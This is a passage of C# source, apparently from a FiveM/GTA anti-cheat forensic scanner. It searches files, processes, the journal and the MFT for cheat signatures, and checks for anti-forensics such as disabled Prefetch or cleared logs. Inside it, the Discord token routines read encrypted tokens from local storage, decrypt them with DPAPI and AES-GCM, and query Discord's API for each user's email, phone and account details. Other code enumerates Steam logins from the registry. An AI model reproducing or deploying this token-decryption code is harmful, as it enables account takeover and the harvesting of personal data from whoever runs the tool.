                _artifacts["FILE_SYSTEM_KEYWORD_MATCHES"] = keywordMatches;
            if (configFiles.Count > 0)
                _artifacts["SUSPICIOUS_CONFIG_FILES"] = configFiles;
            if (metadataMatches.Count > 0) // New artifact
                _artifacts["SUSPICIOUS_METADATA"] = metadataMatches;

            Console.WriteLine($"? Scanned {scannedFiles} files");
            Console.WriteLine($"? Found {cheatCount} known cheats");
            Console.WriteLine($"? Found {keywordMatches.Count} suspicious keyword matches");
            Console.WriteLine($"? Found {hashMatches.Count} hash matches");
            Console.WriteLine($"? Found {metadataMatches.Count} files with suspicious metadata"); // New log line
        }

        private async Task<int> ScanIndividualFile(string filePath, List<object> hashMatches, List<object> keywordMatches, List<object> configFiles, List<object> metadataMatches, int cheatCount)
        {
            var fileName = System.IO.Path.GetFileName(filePath).ToLower();
            var filePathLower = filePath.ToLower();

            // Check if file is in whitelist (legitimate FiveM/GTA files)
            if (CheatDatabase.LegitimateFiles.Contains(fileName))
                return cheatCount;

            // 0. CUSTOM KEYWORD SCAN (Check ALL files)
            if (_customKeywords.Count > 0)
            {
                foreach (var keyword in _customKeywords)
                {
                    if (fileName.Contains(keyword) || filePathLower.Contains(keyword))
                    {
                        var severity = _customKeywordSeverity.ContainsKey(keyword) ? _customKeywordSeverity[keyword] : "Medium";
                        
                        keywordMatches.Add(new
                        {
                            description = $"Custom keyword `{keyword}` found in file path.",
                            details = $"File: `{filePath}`",
                            status = "warning"
                        });

                        // Get last execution time
                        var instanceStatus = GetExecutionInstanceStatus(filePath);
                        
                        _findings.Add(new
                        {
                            category = "CUSTOM_RULES",
                            name = $"Custom Keyword: {keyword}",
                            severity = severity,
                            path = filePath,
                            action = "Detected",
                            source_type = "CustomKeyword",
                            last_execution_time = instanceStatus
                        });
                        break;
                    }
                }
            }

            // 1. FILENAME KEYWORD SCAN - Enhanced with multi-factor verification
            var extension = System.IO.Path.GetExtension(filePath).ToLower();
            var suspiciousExtensions = new[] { ".exe", ".dll", ".bat", ".ps1", ".cmd", ".vbs", ".scr" };
            
            // Skip FiveM citizen-scripting DLLs (legitimate game files)
            if (fileName.Contains("citizen-scripting") || fileName.Contains("citizen-resources") || fileName.Contains("citizen-devtools"))
                return cheatCount;
            
            // Only scan suspicious file types for keywords
            if (suspiciousExtensions.Contains(extension))
            {
                var matchedKeywords = new List<string>();
                foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(30)) // Increased from 20 to 30 for better detection
                {
                    if (fileName.Contains(keyword.ToLower()))
                    {
                        // Skip if in trusted paths
                        var trustedPaths = new[] { "program files", "windows", "microsoft", "jetbrains", "steam", "discord", "node_modules", "appdata\\local\\temp", "fivem", "visual studio", "github", "git" };
                        if (trustedPaths.Any(tp => filePathLower.Contains(tp)))
                            continue;

                        // Skip common false positives - Expanded list
                        var falsePositives = new[] { "loader.js", "loader.ts", "loader.jsx", "moduleloader", "classloader", "dataloader", "citizen-scripting", "bootloader", "systemloader", "winload", "winload.exe", "bootmgr" };
                        if (falsePositives.Any(fp => fileName.Contains(fp)))
                            continue;

                        matchedKeywords.Add(keyword);
                    }
                }
                
                // Multi-factor verification: Require at least 2 indicators OR high-confidence single match
                if (matchedKeywords.Count > 0)
                {
                    var highConfidenceKeywords = new[] { "aimbot", "wallhack", "triggerbot", "eulen", "susano", "keyser", "cherax", "stand.exe", "midnight.exe" };
                    var hasHighConfidence = matchedKeywords.Any(k => highConfidenceKeywords.Any(hc => k.Contains(hc, StringComparison.OrdinalIgnoreCase)));
                    
                    // Only report if: multiple keywords OR high-confidence keyword OR in suspicious location
                    var suspiciousLocations = new[] { "downloads", "desktop", "temp", "appdata\\roaming", "appdata\\local" };
                    var inSuspiciousLocation = suspiciousLocations.Any(sl => filePathLower.Contains(sl));
                    
                    if (matchedKeywords.Count >= 2 || hasHighConfidence || (matchedKeywords.Count == 1 && inSuspiciousLocation))
                    {
                        keywordMatches.Add(new
                        {
                            description = $"Suspicious keyword(s) `{string.Join(", ", matchedKeywords)}` found in filename. (Confidence: {(hasHighConfidence ? "High" : matchedKeywords.Count >= 2 ? "Medium" : "Low")})",
                            details = $"File: `{filePath}` | Matched keywords: {matchedKeywords.Count}",
                            status = hasHighConfidence ? "critical" : matchedKeywords.Count >= 2 ? "threat" : "warning"
                        });

                        // Get last execution time
                        var instanceStatus = GetExecutionInstanceStatus(filePath);
                        
                        _findings.Add(new
                        {
                            category = "Suspicious Filename",
                            name = $"Keyword(s): {string.Join(", ", matchedKeywords)}",
                            severity = hasHighConfidence ? "Critical" : matchedKeywords.Count >= 2 ? "High" : "Medium",
                            path = filePath,
                            action = "Detected",
                            source_type = "File",
                            confidence_score = hasHighConfidence ? 85 : matchedKeywords.Count >= 2 ? 60 : 40,
                            match_count = matchedKeywords.Count,
                            last_execution_time = instanceStatus
                        });
                    }
                }
            }

            // 2. HASH MATCHING
            try
            {
                var md5 = CheatDatabase.CalculateMD5(filePath);
                var sha1 = CheatDatabase.CalculateSHA1(filePath);
                var sha256 = CheatDatabase.CalculateSHA256(filePath);

                foreach (var cheat in CheatDatabase.CheatSignatures)
                {
                    var matched = false;

                    if (cheat.MD5Hashes.Any(h => h.Equals(md5, StringComparison.OrdinalIgnoreCase)) ||
                        cheat.SHA1Hashes.Any(h => h.Equals(sha1, StringComparison.OrdinalIgnoreCase)) ||
                        cheat.SHA256Hashes.Any(h => h.Equals(sha256, StringComparison.OrdinalIgnoreCase)))
                    {
                        matched = true;
                    }

                    if (matched)
                    {
                        // Multi-factor verification: Check for additional indicators
                        var matchedKeys = new List<string> { "hash" };
                        var additionalMatches = 0;
                        
                        // Check if filename also matches
                        if (cheat.FileNames?.Any(fn => fileName.Contains(fn, StringComparison.OrdinalIgnoreCase)) == true)
                        {
                            matchedKeys.Add("filename");
                            additionalMatches++;
                        }
                        
                        // Check if file size matches
                        try
                        {
                            var fileSize = new System.IO.FileInfo(filePath).Length.ToString();
                            if (cheat.FileSizes?.Any(fs => fs == fileSize) == true)
                            {
                                matchedKeys.Add("filesize");
                                additionalMatches++;
                            }
                        }
                        catch { }
                        
                        var scoreResult = ScoringEngine.ComputeScore(cheat, matchedKeys);
                        
                        // Only report if confidence threshold is met
                        if (ScoringEngine.ShouldReportFinding(scoreResult, matchedKeys.Count, true))
                        {
                            hashMatches.Add(new
                            {
                                description = $"File matched the signature for {cheat.Name} (Hash match + {additionalMatches} additional indicator(s))",
                                details = $"File: `{filePath}` | Hash: {sha256} | Confidence: {scoreResult.Score}%",
                                status = "critical"
                            });

                            // Get last execution time
                            var instanceStatus = GetExecutionInstanceStatus(filePath);
                            
                            _findings.Add(new
                            {
                                category = cheat.Category,
                                name = cheat.Name,
                                severity = cheat.Severity,
                                path = filePath,
                                action = "Detected",
                                file_hash = sha256,
                                score = scoreResult.Score,
                                score_contributors = scoreResult.Contributors,
                                source_type = "Hash",
                                match_count = matchedKeys.Count,
                                confidence_score = scoreResult.Score,
                                last_execution_time = instanceStatus
                            });

                            cheatCount++;
                        }
                        break;
                    }
                }
                
                // Check custom hashes
                if (_customHashes.Count > 0)
                {
                    var sha256Upper = sha256.ToUpper();
                    if (_customHashes.Contains(sha256Upper))
                    {
                        var severity = _customHashSeverity.ContainsKey(sha256Upper) ? _customHashSeverity[sha256Upper] : "High";
                        
                        hashMatches.Add(new
                        {
                            description = $"File matched custom hash rule",
                            details = $"File: `{filePath}` | Hash: {sha256}",
                            status = "threat"
                        });

                        // Get last execution time
                        var instanceStatus = GetExecutionInstanceStatus(filePath);
                        
                        _findings.Add(new
                        {
                            category = "CUSTOM_RULES",
                            name = "Custom Hash Match",
                            severity = severity,
                            path = filePath,
                            action = "Detected",
                            file_hash = sha256,
                            source_type = "CustomHash",
                            last_execution_time = instanceStatus
                        });

                        cheatCount++;
                    }
                }
            }
            catch { }
            
            // 3. CONFIG FILE SCAN - Enhanced with multi-factor verification
            var configFileNames = new[] { "config.json", "gui.ini", "settings.ini", "config.cfg", "settings.cock", "imgui.ini" };
            if (configFileNames.Contains(fileName))
            {
                try
                {
                    var content = System.IO.File.ReadAllText(filePath).ToLower();
                    var configKeywords = new[] { "aimbot", "fov", "esp", "triggerbot", "wallhack", "norecoil", "nospread", "silentaim", "ragebot" };
                    var matchedConfigKeywords = new List<string>();
                    var highConfidenceConfigKeywords = new[] { "aimbot", "wallhack", "triggerbot", "silentaim", "ragebot" };

                    foreach (var keyword in configKeywords)
                    {
                        if (content.Contains(keyword))
                        {
                            matchedConfigKeywords.Add(keyword);
                        }
                    }
                    
                    // Multi-factor: Require at least 2 keywords OR high-confidence keyword
                    if (matchedConfigKeywords.Count > 0)
                    {
                        var hasHighConfidence = matchedConfigKeywords.Any(k => highConfidenceConfigKeywords.Contains(k));
                        var suspiciousLocations = new[] { "downloads", "desktop", "temp", "appdata\\roaming", "appdata\\local" };
                        var inSuspiciousLocation = suspiciousLocations.Any(sl => filePathLower.Contains(sl));
                        
                        // Only report if: multiple keywords OR high-confidence keyword OR in suspicious location
                        if (matchedConfigKeywords.Count >= 2 || hasHighConfidence || (matchedConfigKeywords.Count == 1 && inSuspiciousLocation))
                        {
                            configFiles.Add(new
                            {
                                description = $"Suspicious keyword(s) `{string.Join(", ", matchedConfigKeywords)}` found in config file. (Confidence: {(hasHighConfidence ? "High" : matchedConfigKeywords.Count >= 2 ? "Medium" : "Low")})",
                                details = $"File: `{filePath}` | Matched keywords: {matchedConfigKeywords.Count}",
                                status = hasHighConfidence ? "critical" : matchedConfigKeywords.Count >= 2 ? "threat" : "warning"
                            });

                            // Get last execution time
                            var instanceStatus = GetExecutionInstanceStatus(filePath);
                            
                            _findings.Add(new
                            {
                                category = "Suspicious Config",
                                name = $"Config File: {string.Join(", ", matchedConfigKeywords)}",
                                severity = hasHighConfidence ? "Critical" : matchedConfigKeywords.Count >= 2 ? "High" : "Medium",
                                path = filePath,
                                action = "Detected",
                                source_type = "Config",
                                confidence_score = hasHighConfidence ? 85 : matchedConfigKeywords.Count >= 2 ? 65 : 45,
                                match_count = matchedConfigKeywords.Count,
                                last_execution_time = instanceStatus
                            });
                        }
                    }
                }
                catch { }
            }

            // 4. CONTENT KEYWORD SCAN - Enhanced with deep pattern matching and multi-factor verification
            var contentScanExtensions = new[] { ".exe", ".dll", ".bat", ".ps1", ".cmd", ".vbs", ".scr" };

            if (contentScanExtensions.Contains(extension))
            {
                try
                {
                    var fileInfo = new System.IO.FileInfo(filePath);
                    // Skip very large files (likely false positives from legitimate software)
                    if (fileInfo.Length > 50 * 1024 * 1024) // 50MB limit
                        return cheatCount;
                    
                    var bytes = System.IO.File.ReadAllBytes(filePath);
                    
                    // Try multiple encodings for better detection
                    var contentLower = string.Empty;
                    try
                    {
                        contentLower = Encoding.UTF8.GetString(bytes).ToLower();
                    }
                    catch
                    {
                        // Fallback to ASCII for binary files
                        contentLower = Encoding.ASCII.GetString(bytes).ToLower();
                    }
                    
                    // Also scan as raw bytes for obfuscated strings
                    var bytePatterns = new Dictionary<string, byte[]>
                    {
                        { "aimbot", Encoding.ASCII.GetBytes("aimbot") },
                        { "wallhack", Encoding.ASCII.GetBytes("wallhack") },
                        { "triggerbot", Encoding.ASCII.GetBytes("triggerbot") },
                        { "eulen", Encoding.ASCII.GetBytes("eulen") },
                        { "susano", Encoding.ASCII.GetBytes("susano") }
                    };

                    var matchedContentKeywords = new List<string>();
                    var highConfidenceKeywords = new[] { "aimbot", "wallhack", "triggerbot", "eulen", "susano", "keyser", "cherax", "norecoil", "nospread" };
                    
                    // Scan for keywords in content
                    foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(25)) // Increased from 15
                    {
                        var keywordLower = keyword.ToLower();
                        if (contentLower.Contains(keywordLower))
                        {
                            // Skip if in trusted paths
                            var trustedPaths = new[] { "program files", "windows", "microsoft", "jetbrains", "visual studio", "github" };
                            if (trustedPaths.Any(tp => filePathLower.Contains(tp)))
                                continue;
                            
                            matchedContentKeywords.Add(keyword);
                        }
                    }
                    
                    // Also check byte patterns for obfuscated content
                    foreach (var pattern in bytePatterns)
                    {
                        if (ContainsBytePattern(bytes, pattern.Value))
                        {
                            if (!matchedContentKeywords.Contains(pattern.Key))
                                matchedContentKeywords.Add(pattern.Key);
                        }
                    }

                    // Multi-factor verification: Require multiple matches OR high-confidence single match
                    if (matchedContentKeywords.Count > 0)
                    {
                        var hasHighConfidence = matchedContentKeywords.Any(k => highConfidenceKeywords.Any(hc => k.Contains(hc, StringComparison.OrdinalIgnoreCase)));
                        var suspiciousLocations = new[] { "downloads", "desktop", "temp", "appdata\\roaming", "appdata\\local" };
                        var inSuspiciousLocation = suspiciousLocations.Any(sl => filePathLower.Contains(sl));
                        
                        // Only report if: multiple keywords OR high-confidence keyword OR in suspicious location
                        if (matchedContentKeywords.Count >= 2 || hasHighConfidence || (matchedContentKeywords.Count == 1 && inSuspiciousLocation))
                        {
                            var severity = hasHighConfidence ? "critical" : matchedContentKeywords.Count >= 2 ? "threat" : "warning";
                            
                            keywordMatches.Add(new
                            {
                                description = $"Suspicious keyword(s) `{string.Join(", ", matchedContentKeywords)}` found within file content. (Confidence: {(hasHighConfidence ? "High" : matchedContentKeywords.Count >= 2 ? "Medium" : "Low")})",
                                details = $"File: `{filePath}` | Matched keywords: {matchedContentKeywords.Count}",
                                status = severity
                            });

                            // Get last execution time
                            var instanceStatus = GetExecutionInstanceStatus(filePath);
                            
                            _findings.Add(new
                            {
                                category = "Suspicious Content",
                                name = $"Keyword(s): {string.Join(", ", matchedContentKeywords)}",
                                severity = hasHighConfidence ? "Critical" : matchedContentKeywords.Count >= 2 ? "High" : "Medium",
                                path = filePath,
                                action = "Detected",
                                source_type = "Content",
                                confidence_score = hasHighConfidence ? 90 : matchedContentKeywords.Count >= 2 ? 65 : 45,
                                match_count = matchedContentKeywords.Count,
                                last_execution_time = instanceStatus
                            });
                        }
                    }
                }
                catch { }
            }

            // 5. METADATA SCAN
            await ScanFileMetadata(filePath, metadataMatches);

            return cheatCount;
        }

        private async Task ScanJournal()
        {
            var journalEntries = JournalScanner.ScanJournal(500);
            
            var journalArtifacts = journalEntries.Select(entry => new
            {
                description = $"[Journal Entry] Location: {entry.Location} | File: {entry.FileName} | Extension: {entry.Extension} | Size: {entry.FileSize / 1024} KB | Created: {entry.Created:yyyy-MM-dd HH:mm:ss} | Modified: {entry.Modified:yyyy-MM-dd HH:mm:ss} | Accessed: {entry.Accessed:yyyy-MM-dd HH:mm:ss} | Path: {entry.FullPath}",
                details = new
                {
                    location = entry.Location,
                    fileName = entry.FileName,
                    extension = entry.Extension,
                    fileSize = entry.FileSize,
                    created = entry.Created,
                    modified = entry.Modified,
                    accessed = entry.Accessed,
                    fullPath = entry.FullPath
                }
            }).Cast<object>().ToList();

            _artifacts["JOURNAL_ENTRIES"] = journalArtifacts;
            Console.WriteLine($"? Collected {journalEntries.Count} journal entries");
        }

        private async Task ScanMFT()
        {
            var mftEntries = JournalScanner.ScanMFT(1000);
            
            var mftArtifacts = mftEntries.Select(entry => new
            {
                description = $"[MFT Entry] File: {entry.FileName} | Size: {entry.FileSize / 1024} KB | Created: {entry.Created:yyyy-MM-dd HH:mm:ss} | Modified: {entry.Modified:yyyy-MM-dd HH:mm:ss} | Accessed: {entry.Accessed:yyyy-MM-dd HH:mm:ss} | Attributes: {entry.Attributes} | Full Path: {entry.FullPath}",
                details = new
                {
                    fileName = entry.FileName,
                    fileSize = entry.FileSize,
                    created = entry.Created,
                    modified = entry.Modified,
                    accessed = entry.Accessed,
                    attributes = entry.Attributes,
                    fullPath = entry.FullPath
                }
            }).Cast<object>().ToList();

            _artifacts["MFT_ENTRIES"] = mftArtifacts;
            Console.WriteLine($"? Collected {mftEntries.Count} MFT entries");
        }

        private async Task ScanProcesses()
        {
            var processes = System.Diagnostics.Process.GetProcesses();
            var suspiciousProcesses = new List<string>();
            var recentExecutions = new List<object>();

            // Get system boot time
            var bootTime = DateTime.Now - TimeSpan.FromMilliseconds(Environment.TickCount64);

            foreach (var process in processes)
            {
                try
                {
                    var processName = process.ProcessName.ToLower();
                    var startTime = process.StartTime;

                    // Add to recent executions if started after boot
                    if (startTime >= bootTime)
                    {
                        recentExecutions.Add(new
                        {
                            process_name = process.ProcessName,
                            last_executed = startTime.ToString("o"),
                            risk_level = "safe",
                            details = new
                            {
                                pid = process.Id,
                                path = process.MainModule?.FileName ?? "Unknown",
                                start_time = startTime.ToString("yyyy-MM-dd HH:mm:ss")
                            }
                        });
                    }

                    // Check against forbidden processes
                    if (CheatDatabase.ForbiddenProcesses.Contains(process.ProcessName + ".exe"))
                    {
                        // Get execution instance status
                        var procPath = process.MainModule?.FileName ?? "Unknown";
                        var instanceStatus = procPath != "Unknown" ? GetExecutionInstanceStatus(procPath) : "Out of instance";
                        
                        _findings.Add(new
                        {
                            category = "Anti-Debug Detection",
                            name = process.ProcessName,
                            severity = "Critical",
                            path = procPath,
                            action = "Detected",
                            source_type = "Process Scan",
                            last_execution_time = instanceStatus
                        });

                        suspiciousProcesses.Add($"{process.ProcessName} (PID: {process.Id})");
                    }

                    
                    foreach (var keyword in CheatDatabase.SuspiciousKeywords)
                    {
                        if (processName.Contains(keyword.ToLower()))
                        {
                            _findings.Add(new
                            {
                                category = "Suspicious Process",
                                name = process.ProcessName,
                                severity = "High",
                                path = process.MainModule?.FileName ?? "Unknown",
                                action = "Detected",
                                source_type = "Process Scan"
                            });

                            suspiciousProcesses.Add($"{process.ProcessName} (Keyword: {keyword})");
                            break;
                        }
                    }
                }
                catch
                {
                    
                }
            }

            _artifacts["RECENT_EXECUTABLES"] = recentExecutions;

            Console.WriteLine($"? Scanned {processes.Length} processes, found {suspiciousProcesses.Count} suspicious");
            Console.WriteLine($"? Collected {recentExecutions.Count} recent executions since boot");
            if (suspiciousProcesses.Count > 0)
            {
                foreach (var proc in suspiciousProcesses.Take(5))
                {
                    Console.WriteLine($"   ??  {proc}");
                }
                if (suspiciousProcesses.Count > 5)
                {
                    Console.WriteLine($"   ... and {suspiciousProcesses.Count - 5} more");
                }
            }
        }

        private async Task ScanNetwork()
        {
            var connections = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties()
                .GetActiveTcpConnections();

            var suspiciousConnections = new List<string>();

            foreach (var connection in connections)
            {
                var remoteIp = connection.RemoteEndPoint.Address.ToString();
                var remotePort = connection.RemoteEndPoint.Port;

                // Check against suspicious domains (would need DNS resolution)
                // For now, just log all connections
            }

            var networkArtifacts = connections.Select(conn => new
            {
                description = $"TCP Connection: {conn.LocalEndPoint} -> {conn.RemoteEndPoint} ({conn.State})",
                details = new
                {
                    localEndpoint = conn.LocalEndPoint.ToString(),
                    remoteEndpoint = conn.RemoteEndPoint.ToString(),
                    state = conn.State.ToString()
                }
            }).Cast<object>().ToList();

            _artifacts["NETWORK_CONNECTIONS"] = networkArtifacts;
            Console.WriteLine($"? Scanned {connections.Length} network connections");
        }

        private async Task ScanUserAccounts()
        {
            var userAccounts = new List<object>();

            try
            {
                // Scan for Discord tokens
                var discordAccounts = await ScanDiscordTokens();
                userAccounts.AddRange(discordAccounts);

                // Scan for Steam accounts
                var steamAccounts = await ScanSteamAccounts();
                userAccounts.AddRange(steamAccounts);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning user accounts: {ex.Message}");
            }

            if (userAccounts.Count > 0)
            {
                _artifacts["USER_ACCOUNTS"] = userAccounts;
            }

            Console.WriteLine($"? Found {userAccounts.Count} user account(s)");
        }

        private async Task<List<object>> ScanDiscordTokens()
        {
            var accounts = new List<object>();
            var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            var discordPaths = new Dictionary<string, string>
            {
                { "Discord", System.IO.Path.Combine(roaming, "discord") },
                { "Discord Canary", System.IO.Path.Combine(roaming, "discordcanary") },
                { "Discord PTB", System.IO.Path.Combine(roaming, "discordptb") },
                { "Lightcord", System.IO.Path.Combine(roaming, "Lightcord") }
            };

            foreach (var kvp in discordPaths)
            {
                try
                {
                    var tokens = await ExtractDiscordTokens(kvp.Value, kvp.Key);
                    accounts.AddRange(tokens);
                }
                catch { }
            }

            return accounts;
        }

        private async Task<List<object>> ExtractDiscordTokens(string basePath, string platform)
        {
            var accounts = new List<object>();
            var levelDbPath = System.IO.Path.Combine(basePath, "Local Storage", "leveldb");

            if (!System.IO.Directory.Exists(levelDbPath))
                return accounts;

            try
            {
                var tokens = new HashSet<string>();

                // Read all .ldb and .log files
                foreach (var file in System.IO.Directory.GetFiles(levelDbPath))
                {
                    if (!file.EndsWith(".ldb") && !file.EndsWith(".log"))
                        continue;

                    try
                    {
                        var content = System.IO.File.ReadAllText(file);
                        var matches = System.Text.RegularExpressions.Regex.Matches(content, @"dQw4w9WgXcQ:[^""]*");

                        foreach (System.Text.RegularExpressions.Match match in matches)
                        {
                            var token = match.Value;
                            if (!string.IsNullOrEmpty(token) && !tokens.Contains(token))
                            {
                                tokens.Add(token);

                                // Try to decrypt and validate token
                                try
                                {
                                    var decryptedToken = await DecryptDiscordToken(token, basePath);
                                    if (!string.IsNullOrEmpty(decryptedToken))
                                    {
                                        var userInfo = await GetDiscordUserInfo(decryptedToken);
                                        if (userInfo != null)
                                        {
                                            accounts.Add(new
                                            {
                                                platform = "Discord",
                                                client = platform,
                                                username = userInfo.username,
                                                user_id = userInfo.id,
                                                email = userInfo.email,
                                                phone = userInfo.phone,
                                                avatar_url = $"https://cdn.discordapp.com/avatars/{userInfo.id}/{userInfo.avatar}.png",
                                                mfa_enabled = userInfo.mfa_enabled,
                                                verified = userInfo.verified,
                                                locale = userInfo.locale,
                                                flags = userInfo.flags
                                                // Token is NOT stored - it's sensitive data
                                            });
                                        }
                                    }
                                }
                                catch { }
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }

            return accounts;
        }

        private async Task<string> DecryptDiscordToken(string encryptedToken, string basePath)
        {
            try
            {
                // Read encryption key from Local State
                var localStatePath = System.IO.Path.Combine(basePath, "Local State");
                if (!System.IO.File.Exists(localStatePath))
                    return null;

                var localStateContent = System.IO.File.ReadAllText(localStatePath);
                var localStateJson = JsonConvert.DeserializeObject<dynamic>(localStateContent);
                var encryptedKey = localStateJson.os_crypt.encrypted_key.ToString();

                // Decode base64 key
                var keyBytes = Convert.FromBase64String(encryptedKey);
                
                // Remove DPAPI prefix (first 5 bytes)
                var keyWithoutPrefix = new byte[keyBytes.Length - 5];
                Array.Copy(keyBytes, 5, keyWithoutPrefix, 0, keyWithoutPrefix.Length);

                // Decrypt using DPAPI
                var decryptedKey = System.Security.Cryptography.ProtectedData.Unprotect(
                    keyWithoutPrefix,
                    null,
                    System.Security.Cryptography.DataProtectionScope.CurrentUser
                );

                // Extract encrypted data from token
                var tokenParts = encryptedToken.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None);
                if (tokenParts.Length < 2)
                    return null;

                var encryptedData = Convert.FromBase64String(tokenParts[1]);

                // Extract IV (12 bytes after first 3 bytes)
                var iv = new byte[12];
                Array.Copy(encryptedData, 3, iv, 0, 12);

                // Extract ciphertext (everything after IV)
                var ciphertext = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, ciphertext, 0, ciphertext.Length);

                // Decrypt using AES-GCM
                using (var aes = new System.Security.Cryptography.AesGcm(decryptedKey))
                {
                    var decrypted = new byte[ciphertext.Length - 16]; // Remove tag
                    var tag = new byte[16];
                    Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16);

                    var actualCiphertext = new byte[ciphertext.Length - 16];
                    Array.Copy(ciphertext, 0, actualCiphertext, 0, actualCiphertext.Length);

                    aes.Decrypt(iv, actualCiphertext, tag, decrypted);
                    return Encoding.UTF8.GetString(decrypted);
                }
            }
            catch
            {
                return null;
            }
        }

        private async Task<dynamic> GetDiscordUserInfo(string token)
        {
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    client.DefaultRequestHeaders.Add("Authorization", token);
                    client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0");

                    var response = await client.GetAsync("https://discord.com/api/v10/users/@me");
                    if (!response.IsSuccessStatusCode)
                        return null;

                    var content = await response.Content.ReadAsStringAsync();
                    return JsonConvert.DeserializeObject<dynamic>(content);
                }
            }
            catch
            {
                return null;
            }
        }

        private async Task<List<object>> ScanSteamAccounts()
        {
            var accounts = new List<object>();

            try
            {
                
                var steamPath = @"SOFTWARE\Valve\Steam";
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(steamPath))
                {
                    if (key != null)
                    {
                        var autoLoginUser = key.GetValue("AutoLoginUser")?.ToString();
                        var rememberPassword = key.GetValue("RememberPassword")?.ToString();
                        var steamPath64 = key.GetValue("SteamPath")?.ToString();

                        if (!string.IsNullOrEmpty(autoLoginUser))
                        {
                            accounts.Add(new
                            {
                                platform = "Steam",
                                username = autoLoginUser,
                                auto_login = true,
                                remember_password = rememberPassword == "1",
                                steam_path = steamPath64
                            });
                        }

                        
                        var usersKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Valve\Steam\Users");
                        if (usersKey != null)
                        {
                            foreach (var subKeyName in usersKey.GetSubKeyNames())
                            {
                                using (var userKey = usersKey.OpenSubKey(subKeyName))
                                {
                                    var accountName = userKey?.GetValue("AccountName")?.ToString();
                                    var personaName = userKey?.GetValue("PersonaName")?.ToString();
                                    var mostRecent = userKey?.GetValue("mostrecent")?.ToString();

                                    if (!string.IsNullOrEmpty(accountName))
                                    {
                                        accounts.Add(new
                                        {
                                            platform = "Steam",
                                            username = accountName,
                                            persona_name = personaName,
                                            steam_id = subKeyName,
                                            most_recent = mostRecent == "1"
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch { }

            return accounts;
        }



        // ==================== NEW FORENSIC METHODS ====================

        private async Task DetectBypassMethods()
        {
            var bypassMethods = new List<object>();
            var bypassScore = 0;
            var detectedMethods = new List<string>();

            try
            {
                // 1. Check if Prefetch is disabled
                var prefetchDisabled = await CheckPrefetchDisabled();
                if (prefetchDisabled)
                {
                    bypassScore += 30;
                    detectedMethods.Add("Prefetch Disabled");
                    bypassMethods.Add(new
                    {
                        method = "Prefetch Service Disabled",
                        description = "Windows Prefetch is disabled - prevents tracking of executed programs",
                        severity = "High",
                        details = "Registry: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\\EnablePrefetcher = 0",
                        impact = "Execution history cannot be tracked via Prefetch files"
                    });

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = "Prefetch Disabled",
                        severity = "High",
                        path = "Registry",
                        action = "Anti-forensics technique detected",
                        source_type = "Bypass Detection"
                    });
                }

                // 2. Check if Event Log service is stopped
                var eventLogStopped = await CheckEventLogService();
                if (eventLogStopped)
                {
                    bypassScore += 40;
                    detectedMethods.Add("Event Log Stopped");
                    bypassMethods.Add(new
                    {
                        method = "Windows Event Log Service Stopped",
                        description = "Event Log service is not running - prevents logging of system events",
                        severity = "Critical",
                        details = "Service: EventLog (Windows Event Log) is stopped or disabled",
                        impact = "System events, security logs, and application logs are not being recorded"
                    });

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = "Event Log Service Stopped",
                        severity = "Critical",
                        path = "Services",
                        action = "Critical anti-forensics technique",
                        source_type = "Bypass Detection"
                    });
                }

                // 3. Check if Event Logs have been cleared recently
                var clearedLogs = await CheckClearedEventLogs();
                if (clearedLogs.Count > 0)
                {
                    bypassScore += 25;
                    detectedMethods.Add("Event Logs Cleared");
                    foreach (var log in clearedLogs)
                    {
                        bypassMethods.Add(new
                        {
                            method = "Event Log Cleared",
                            description = $"Event log '{log.LogName}' was cleared recently",
                            severity = "High",
                            details = $"Log: {log.LogName}\nCleared: {log.ClearedTime:yyyy-MM-dd HH:mm:ss}\nCleared by: {log.ClearedBy}",
                            impact = "Evidence of program execution and system events has been deleted"
                        });
                    }

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = $"Event Logs Cleared ({clearedLogs.Count} logs)",
                        severity = "High",
                        path = "Event Logs",
                        action = "Evidence tampering detected",
                        source_type = "Bypass Detection"
                    });
                }

                // 4. Check for cleaner tools (CCleaner, BleachBit, etc.)
                var cleanerTools = await DetectCleanerTools();
                if (cleanerTools.Count > 0)
                {
                    bypassScore += 20;
                    detectedMethods.Add("Cleaner Tools");
                    foreach (var tool in cleanerTools)
                    {
                        bypassMethods.Add(new
                        {
                            method = "Privacy/Cleaner Tool Detected",
                            description = $"Found evidence of '{tool.Name}' - commonly used to erase forensic evidence",
                            severity = "Medium",
                            details = $"Tool: {tool.Name}\nPath: {tool.Path}\nLast Run: {tool.LastRun:yyyy-MM-dd HH:mm:ss}",
                            impact = "May have deleted Prefetch, Registry, Browser History, and other forensic artifacts"
                        });
                    }

                    _findings.Add(new
                    {
                        category = "Bypass Methods",
                        name = $"Cleaner Tools ({cleanerTools.Count} detected)",
                        severity = "Medium",
                        path = "System",
                        action = "Anti-forensics tools detected",
                        source_type = "Bypass Detection"
                    });
                }

                // 5. Check if Prefetch folder is empty or has very few files
                var prefetchSuspicious = await CheckPrefetchFolder();
                if (prefetchSuspicious.IsEmpty || prefetchSuspicious.TooFew)
                {
                    bypassScore += 15;
                    detectedMethods.Add("Prefetch Anomaly");
                    bypassMethods.Add(new
                    {
                        method = "Prefetch Folder Anomaly",
                        description = prefetchSuspicious.IsEmpty 
                            ? "Prefetch folder is completely empty - highly suspicious"
                            : $"Prefetch folder has only {prefetchSuspicious.FileCount} files - suspiciously low",
                        severity = "Medium",
                        details = $"Expected: 100-200 files\nFound: {prefetchSuspicious.FileCount} files\nThis suggests manual deletion or cleaning",
                        impact = "Execution history has been tampered with"
